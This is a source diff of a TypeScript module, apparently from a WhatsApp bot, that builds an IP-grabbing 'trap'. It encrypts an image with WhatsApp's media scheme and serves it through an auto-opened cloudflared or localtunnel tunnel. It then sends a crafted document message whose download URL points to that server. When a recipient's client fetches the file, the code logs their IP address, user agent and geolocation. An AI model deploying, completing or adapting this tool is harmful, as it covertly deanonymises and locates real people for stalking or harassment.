@@ -1,11 +1,13 @@
 import { createCipheriv, createHash, createHmac, hkdfSync, randomBytes } from "node:crypto";
-import type { IncomingMessage, ServerResponse } from "node:http";
+import { createServer, type Server } from "node:http";
+import { spawn, type ChildProcess } from "node:child_process";
+import { existsSync } from "node:fs";
 
-export const TRAP_BASE_URL = (process.env.TRAP_BASE_URL ?? "").replace(/\/+$/, "");
 export const TRAP_TTL_MS = Number(process.env.TRAP_TTL_MS ?? 180_000);
 
 const MAX_HITS = 4;
 const KEEP_AFTER_CLOSE_MS = 15 * 60_000;
+const LOCAL_HOST = "127.0.0.1";
 
 export interface GeoInfo {
   country?: string;
@@ -32,6 +34,7 @@ export interface TrapHit {
 
 export interface TrapSession {
   id: string;
+  base: string;
   fileName: string;
   bytes: Buffer;
   mediaKey: Buffer;
@@ -50,6 +53,112 @@ export interface TrapSession {
 }
 
 const sessions = new Map<string, TrapSession>();
+
+/* ─────────────── infraestructura: listener + túnel ─────────────── */
+
+let server: Server | null = null;
+let port = 0;
+let publicBase: string | null = (process.env.TRAP_BASE_URL ?? "").replace(/\/+$/, "") || null;
+let tunnelProc: ChildProcess | null = null;
+let tunnelObj: { url: string; close: () => void } | null = null;
+let bootstrapping: Promise<string> | null = null;
+
+async function startServer(): Promise<void> {
+  if (server) return;
+  server = createServer((req, res) => void trapHandler(req, res));
+  await new Promise<void>((resolve, reject) => {
+    server!.once("error", reject);
+    server!.listen(0, LOCAL_HOST, () => {
+      port = (server!.address() as { port: number }).port;
+      resolve();
+    });
+  });
+}
+
+async function probe(base: string): Promise<boolean> {
+  try {
+    const r = await fetch(`${base}/__ping?t=${Date.now()}`, { signal: AbortSignal.timeout(7000) });
+    return (await r.text()).trim() === "pong";
+  } catch {
+    return false;
+  }
+}
+
+async function openTunnel(): Promise<string> {
+  const cf = ["cloudflared", "npx"].find((bin) =>
+    bin === "npx" ? true : existsSync(`/usr/bin/${bin}`) || existsSync(`/usr/local/bin/${bin}`) || existsSync(`/data/data/com.termux/files/usr/bin/${bin}`)
+  );
+
+  if (cf) {
+    try {
+      const args =
+        cf === "npx"
+          ? ["--yes", "cloudflared", "tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"]
+          : ["tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"];
+
+      tunnelProc = spawn(cf, args, { stdio: ["ignore", "pipe", "pipe"] });
+      const url = await new Promise<string | null>((resolve) => {
+        const timer = setTimeout(() => resolve(null), 25_000);
+        const onData = (buf: Buffer) => {
+          const m = buf.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
+          if (m) {
+            clearTimeout(timer);
+            resolve(m[0]);
+          }
+        };
+        tunnelProc!.stdout?.on("data", onData);
+        tunnelProc!.stderr?.on("data", onData);
+        tunnelProc!.once("exit", () => resolve(null));
+      });
+
+      if (url && (await probe(url))) return url;
+      tunnelProc?.kill();
+      tunnelProc = null;
+    } catch {
+      tunnelProc?.kill();
+      tunnelProc = null;
+    }
+  }
+
+  try {
+    const lt: any = await import("localtunnel").catch(() => null);
+    if (lt?.default) {
+      const t = await lt.default({ port, local_host: LOCAL_HOST });
+      tunnelObj = t;
+      if (await probe(t.url)) return t.url as string;
+      t.close();
+      tunnelObj = null;
+    }
+  } catch {}
+
+  throw new Error(
+    "No se pudo abrir túnel público. Instala cloudflared (`pkg install cloudflared` en Termux) o corre `npm i localtunnel`, o define TRAP_BASE_URL."
+  );
+}
+
+export async function ensurePublicBase(): Promise<string> {
+  if (publicBase) return publicBase;
+  if (bootstrapping) return bootstrapping;
+  bootstrapping = (async () => {
+    await startServer();
+    publicBase = await openTunnel();
+    return publicBase;
+  })().finally(() => {
+    bootstrapping = null;
+  });
+  return bootstrapping;
+}
+
+export function stopTrap() {
+  tunnelObj?.close();
+  tunnelProc?.kill();
+  server?.close();
+  tunnelObj = null;
+  tunnelProc = null;
+  server = null;
+}
+
+/* ─────────────── cifrado de media (esquema WhatsApp) ─────────────── */
 
 function hkdf(key: Buffer, salt: Buffer, info: string, size: number): Buffer {
   return Buffer.from(hkdfSync("sha256", key, salt, Buffer.from(info), size));
@@ -73,6 +182,8 @@ function encryptMedia(plain: Buffer) {
   };
 }
 
+/* ─────────────── sesiones ─────────────── */
+
 export interface CreateSessionOpts {
   plain: Buffer;
   fileName: string;
@@ -84,10 +195,18 @@ export interface CreateSessionOpts {
   onExpire: (s: TrapSession) => Promise<void>;
 }
 
-export function createSession(opts: CreateSessionOpts): TrapSession {
+export function hasActiveSession(chatJid: string): boolean {
+  for (const s of sessions.values()) if (!s.closed && s.chatJid === chatJid) return true;
+  return false;
+}
+
+export async function createSession(opts: CreateSessionOpts): Promise<TrapSession> {
+  const base = await ensurePublicBase();
   const enc = encryptMedia(opts.plain);
+
   const s = {
     id: randomBytes(9).toString("base64url"),
+    base,
     fileName: opts.fileName,
     bytes: enc.bytes,
     mediaKey: enc.mediaKey,
@@ -106,8 +225,17 @@ export function createSession(opts: CreateSessionOpts): TrapSession {
   } satisfies TrapSession;
 
   s.timer = setTimeout(() => void expire(s), TRAP_TTL_MS);
+  s.timer.unref?.();
   sessions.set(s.id, s);
   return s;
+}
+
+export function closeSession(s: TrapSession) {
+  clearTimeout(s.timer);
+  if (!s.closed) {
+    s.closed = true;
+    void s.onExpire(s).catch(() => undefined);
+  }
 }
 
 async function expire(s: TrapSession) {
@@ -118,11 +246,13 @@ async function expire(s: TrapSession) {
   t.unref?.();
 }
 
-function clientIp(req: IncomingMessage): string {
+/* ─────────────── captura ─────────────── */
+
+function clientIp(req: import("node:http").IncomingMessage): string {
   const xff = String(req.headers["x-forwarded-for"] ?? "");
   const cf = String(req.headers["cf-connecting-ip"] ?? "");
   const raw = cf || xff.split(",")[0].trim() || String(req.socket.remoteAddress ?? "");
-  return raw.replace(/^::ffff:/, "").replace(/^\[|\]$/g, "");
+  return raw.replace(/^::ffff:/, "").replace(/^\[|\]$/g, "").trim();
 }
 
 function isPrivate(ip: string) {
@@ -188,9 +318,15 @@ async function geoLookup(ip: string): Promise<GeoInfo | null> {
   return null;
 }
 
-/** Handler compatible con Express y con http nativo. */
-export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
+export async function trapHandler(req: import("node:http").IncomingMessage, res: import("node:http").ServerResponse) {
   const path = new URL(req.url ?? "/", "http://local").pathname;
+
+  if (path === "/__ping") {
+    res.statusCode = 200;
+    res.setHeader("Content-Type", "text/plain");
+    return res.end("pong");
+  }
+
   const [, prefix, id] = path.split("/");
   if (prefix !== "t") {
     res.statusCode = 404;
@@ -208,6 +344,7 @@ export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
   res.setHeader("Content-Type", "image/jpeg");
   res.setHeader("Content-Length", String(s.bytes.length));
   res.setHeader("Content-Disposition", `attachment; filename="${s.fileName}"`);
+  res.setHeader("Accept-Ranges", "none");
   res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
   res.setHeader("Pragma", "no-cache");
   res.setHeader("Access-Control-Allow-Origin", "*");
@@ -225,15 +362,17 @@ export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
     ua: String(req.headers["user-agent"] ?? "desconocido"),
     at: Date.now(),
   };
-  s.hits.push(hit);
+  const idx = s.hits.push(hit) - 1;
   hit.geo = await geoLookup(ip).catch(() => null);
-  await s.onHit(s, hit).catch(() => undefined);
+  await s.onHit(s, hit, idx).catch(() => undefined);
 }
+
+/* ─────────────── mensaje ─────────────── */
 
 export function buildDocumentMessage(s: TrapSession, caption: string, contextInfo?: any) {
   return {
     documentMessage: {
-      url: `${TRAP_BASE_URL}/t/${s.id}/${s.fileName}`,
+      url: `${s.base}/t/${s.id}/${s.fileName}`,
       directPath: `/t/${s.id}/${s.fileName}`,
       mimetype: "image/jpeg",
       fileName: s.fileName,
